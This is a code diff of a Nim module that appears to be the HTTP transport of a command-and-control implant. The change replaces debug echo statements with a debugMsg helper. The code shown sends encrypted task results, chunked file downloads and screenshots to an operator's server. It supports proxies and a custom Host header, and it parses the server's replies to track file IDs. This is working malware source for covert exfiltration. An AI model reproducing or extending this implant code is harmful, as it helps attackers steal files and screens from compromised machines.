@@ -11,23 +11,21 @@ when defined(AESPSK):
     from crypto import encryptStr,decryptStr
     from uri import decodeUrl
 
+from debug import debugMsg
+
 # TODO sort config
 proc Fetch*(curConfig: Config, bdata: string, isGet: bool): Future[string] {.async.} = 
     let dataToSend = when defined(AESPSK): encryptStr(curConfig.PayloadUUID, curConfig.Psk, bdata) else: bdata
     var proxySet = false
     var myProxy : Proxy
-    when not defined(release):
-        echo "Curconfig.ProxyAddress: ", curConfig.ProxyAddress
+    debugMsg("Curconfig.ProxyAddress: ", curConfig.ProxyAddress)
     if(len(curConfig.ProxyAddress) > 1):
         myProxy = newProxy(curConfig.ProxyAddress, curConfig.ProxyUser & ":" & curConfig.ProxyPassword)
         proxySet = true
-    when not defined(release):
-        echo "Creating client, is proxyset?  ", $(proxySet)
+    debugMsg("Creating client, is proxyset?  ", $(proxySet))
     # check if config.hostheader is set and if it is add httpheader check here
     let client = if proxySet: newAsyncHttpClient( if len(curConfig.UserAgent) > 0: curConfig.UserAgent else: defUserAgent, proxy = myProxy) 
                  else: newAsyncHttpClient(if len(curConfig.UserAgent) > 0: curConfig.UserAgent else: defUserAgent)
-    when not defined(release):
-        echo "Client has been created"
     if(len(curConfig.HostHeader) > 0):
         client.headers = newHttpHeaders({"Host": curConfig.HostHeader})
     #var temp = curConfig
@@ -37,19 +35,15 @@ proc Fetch*(curConfig: Config, bdata: string, isGet: bool): Future[string] {.asy
     #curConfig = temp
     try:
         if isGet:
-            when not defined(release):
-                echo "Attempting to create get url"
-                echo "dataToSend: ", dataToSend
-                echo "curConfig: ", $(curConfig)
-                echo "get url: ", $(parseUri(curConfig.Servers[0].Domain) / curConfig.GetUrl ? {curConfig.Param: dataToSend})
-                echo "making request"
+            debugMsg("Attempting to create get url and make request")
+            debugMsg("dataToSend: ", dataToSend)
+            debugMsg("curConfig: ", $(curConfig))
+            debugMsg("get url: ", $(parseUri(curConfig.Servers[0].Domain) / curConfig.GetUrl ? {curConfig.Param: dataToSend}))
             result = await getContent(client, $(parseUri(curConfig.Servers[0].Domain) / curConfig.GetUrl ? {curConfig.Param: dataToSend}))
         else:
-            when not defined(release):
-                echo "post url: ", $(parseUri(curConfig.Servers[0].Domain) / curConfig.PostUrl), "data: ", dataToSend
+            debugMsg("post url: ", $(parseUri(curConfig.Servers[0].Domain) / curConfig.PostUrl), "data: ", dataToSend)
             result = await postContent(client, $(parseUri(curConfig.Servers[0].Domain) / curConfig.PostUrl), dataToSend)
-        when not defined(release):
-            echo "Just received data back from get or post request: ", result
+        debugMsg("Just received data back from get or post request: ", result)
         when defined(AESPSK):
             # echo "inside post request just received back: encrypted: ", result
             result = decryptStr(curConfig.PayloadUUID, curConfig.Psk, result)
@@ -58,8 +52,7 @@ proc Fetch*(curConfig: Config, bdata: string, isGet: bool): Future[string] {.asy
         let
             e = getCurrentException()
             msg = getCurrentExceptionMsg()
-        when not defined(release):
-            echo "An exception has occurred when attempting to do a GET request: ", repr(e), " with message ", msg
+        debugMsg("An exception has occurred when attempting to do a request: ", repr(e), " with message ", msg)
         result = repr(e)
     finally:
         # Clean up connections
@@ -74,15 +67,12 @@ proc postUp*(curConfig: Config, results: seq[Job]): Future[tuple[postupResp: str
             let respJson = %*{"action" : "post_response", "responses": []}
             for i in 0..len(results)-1:
                 let job = results[i]
-                when not defined(release):
-                    echo "Got job: ", $(job)
+                debugMsg("Got job: ", $(job))
                 var jNode: JsonNode
                 if job.Download or job.Screenshot:
-                    when not defined(release):
-                        echo "Inside postUp job is a download job"
+                    debugMsg("Inside postUp job is a download job")
                     if len(job.FileId) == 0:
-                        when not defined(release):
-                            echo "length of fileid is 0"
+                        debugMsg("length of fileid is 0")
                         jNode = %*
                             {
                                     "total_chunks": job.TotalChunks,
@@ -96,8 +86,7 @@ proc postUp*(curConfig: Config, results: seq[Job]): Future[tuple[postupResp: str
                         isDownloadFirst = true
                         taskTable[job.TaskId] = job
                     elif job.ChunkNum == job.TotalChunks:
-                        when not defined(release):
-                            echo "chunknum == totalchunks"
+                        debugMsg("chunknum == totalchunks")
                         jNode = %*
                             {
                                     "total_chunks": job.TotalChunks,
@@ -142,34 +131,28 @@ proc postUp*(curConfig: Config, results: seq[Job]): Future[tuple[postupResp: str
                       
 
                 respJson["responses"].add(jNode)
-            when not defined(release):
-                echo "respJson: ", $(respJson)
+            debugMsg("respJson: ", $(respJson))
             let data = when defined(AESPSK): $(respJson) else: encode(curConfig.PayloadUUID & $(respJson), true)
             let fetchData = await Fetch(curConfig, data, false)
             if isDownloadFirst:
-                when not defined(release):
-                    echo "isdownload first \n"
+                debugMsg("isdownload first \n")
                     # Indicates json response needs to be parsed for file_id
-                    echo "your fetchdata: ", $(fetchData)
+                debugMsg("your fetchdata: ", $(fetchData))
                     # echo "fetchdata decoded: ", decode(fetchData)
                 let parsedJson = when defined(AESPSK): parseJson(fetchData[36 .. ^1]) else: parseJson(decode(fetchData)[36 .. ^1]) 
-                when not defined(release):
-                    echo "parsedJson: ", $(parsedJson)
+                debugMsg("parsedJson: ", $(parsedJson))
                 for resp in parsedJson["responses"].getElems():
                     # check if taskid is in dictionary if so 
                     # extract file_id value and set it equal to correct Job
                     let jtaskid = resp["task_id"].getStr()
                     if taskTable.hasKey(jtaskid):
-                        when not defined(release):
-                            echo "key has been found in dict: here is resp: ", $(resp)
+                        debugMsg("key has been found in dict: here is resp: ", $(resp))
                         let file_id = resp["file_id"].getStr()
                         var jobValue = taskTable[jtaskid]
                         jobValue.FileId = file_id
-                        when not defined(release):
-                            echo "updated fileid in jobValue, adding it to newJobSeq ", $(jobValue)
+                        debugMsg("updated fileid in jobValue, adding it to newJobSeq ", $(jobValue))
                         newJobSeq.add(jobValue)
-                    when not defined(release):
-                        echo "resp: ", $(resp)
+                    debugMsg("resp: ", $(resp))
             result = (postupResp: fetchData, resSeq: newJobSeq)
         else:
             result = (postupResp: "No new jobs", resSeq: newJobSeq)
@@ -177,4 +160,4 @@ proc postUp*(curConfig: Config, results: seq[Job]): Future[tuple[postupResp: str
         let
             e = getCurrentException()
             msg = getCurrentExceptionMsg()
-        result = (postupResp: "An exception has occurred when attempting to do a GET request: " & repr(e) & " with message " & msg, resSeq: newJobSeq)
+        result = (postupResp: "An exception has occurred when attempting to do a request: " & repr(e) & " with message " & msg, resSeq: newJobSeq)
